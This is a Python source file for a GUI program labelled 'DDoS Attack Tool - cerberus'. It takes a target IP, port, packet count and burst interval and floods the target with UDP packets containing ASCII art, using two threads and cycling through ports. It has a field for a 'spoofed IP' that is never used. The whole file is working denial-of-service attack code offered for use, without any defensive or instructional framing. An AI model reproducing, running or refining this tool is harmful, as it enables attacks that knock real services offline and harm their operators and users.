import socket
import threading
import time
import tkinter as tk

cerberus_ascii_art = """
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXWWWWWWWWWWXXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXl,OWWWWWWWW0;:KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNo. ,kWWWWWWO;. :XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWk. ...dNWWNx...  oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc  ..  ':c;. .'  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc             .  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc                '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc    .'.  .,.    '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWXdoKMWWWWWWWWx.  .;;.   ;:'   cXWWWWWWWWXdxXWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWX0xc. .kWWNXXWWWWNd.  .:.   ;,   :XMWWWNNWWWO. 'lkKNWWWWWWWWWWWWWW
WWWWWWWWWWWXx:..    .:c;,'oNWWWNo..           .:KWWWNx,;clc.    .':xXWWWWWWWWWWW
WWWWWWWWNkc.        .     .;dKWk. .          .. oWXk:.     .        'cONWWWWWWWW
WWWWWWWKo'         ..        ok'   .        ..  .xd.       ..         .l0WWWWWWW
WWWWWWNo:c:,                .:.    ..       .    .c.        .       ';:coXWWWWWW
WWWWWW0,.',.       ..       ;;      ........      ::       ..       .;,.,0WWWWWW
WWWWNO;            .        ',                    ..        .            ;OWWWWW
WWWKl.            '.        ;'                    .,        ...           .lKWWW
WNk'     ..       .         ':.                  .:,         .        .     'kNW
MO.   ...';codxkkxdc.        ,'                  .,        .:lddddol:,....   .kW
WNklc::oOXWWWWWWWWWWXl        ..                ..        :0WWWWWWWWWNKko:;:cxXW
WWWWWNWWWWWWWWWWWWWWWk.        .'              ''        .xWWWWWWWWWWWWWWWXNWWWW
WWWWWWWWWWWWWWWWWWWWW0d,        ,c.          .c:        'oONWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWKl,.      'c'        .c,      ..:0WWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWNNKxc;.   .;;.    .;:.   .,:o0XNWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXko:'.,;'..':,..;lx0NWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXOO0K00kk0XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
MWWWMWWWWWWWWWWMWWWMWWWMWWWWWWWWWWMWWWMWWWWMWWWWWWWWWWMWWWMWWWMWWWMWWWWWWWWWWMWW


"""

BYTES_PER_GB = 1024 * 1024 * 1024
packet_size = len(cerberus_ascii_art.encode())
data_transfer_size = BYTES_PER_GB

root = tk.Tk()
root.title("DDoS Attack Tool - cerberus")

tk.Label(root, text="Enter IP Address of The Target").pack()
target_entry = tk.Entry(root)
target_entry.pack()

tk.Label(root, text="Enter The Spoofed IP Address").pack()
fake_ip_entry = tk.Entry(root)
fake_ip_entry.pack()

tk.Label(root, text="Enter The Port Number").pack()
port_entry = tk.Entry(root)
port_entry.pack()

tk.Label(root, text="Enter Number of Packets to Send").pack()
num_packets_entry = tk.Entry(root)
num_packets_entry.pack()

tk.Label(root, text="Enter Burst Interval (in seconds)").pack()
burst_interval_entry = tk.Entry(root)
burst_interval_entry.pack()

def attack(target, port, num_packets, time_interval_seconds):
    global attack_num
    attack_num = 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(num_packets):
            data_packet = cerberus_ascii_art.encode()
            sock.sendto(data_packet, (target, port))
            time.sleep(time_interval_seconds)
            attack_num += 1
            port = (port + 1) % 65535
            print(f"Sent {attack_num} packet to {target} through port: {port}")
    except  Exception as  e:
        print("An error occurred during the attack:", e)

def start_attack():
    target = target_entry.get()
    fake_ip_entry.get()
    port = int(port_entry.get())
    num_packets = int(num_packets_entry.get())
    burst_interval = float(burst_interval_entry.get())

    time_interval_seconds = 1 / num_packets

    # Create a separate thread for the attack
    attack_thread = threading.Thread(target=attack, args=(target, port, num_packets, time_interval_seconds))
    attack_thread.start()

    # Create a separate thread for the burst mode
    burst_thread = threading.Thread(target=send_burst, args=(target, port, num_packets, burst_interval))
    burst_thread.start()

def send_burst(target, port, num_packets, burst_interval):
    global attack_num

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while attack_num < num_packets:
            for _ in range(10**10):
                data_packet = cerberus_ascii_art.encode()
                sock.sendto(data_packet, (target, port))
                attack_num += 1
                port = (port + 1) % 65535
                print(f"Sent {attack_num} packet to {target} through port: {port}")
            time.sleep(burst_interval)
    except  Exception as  e:
        print("An error occurred during the burst mode:", e)

tk.Button(root, text="Start Attack", command=start_attack).pack()

root.mainloop()
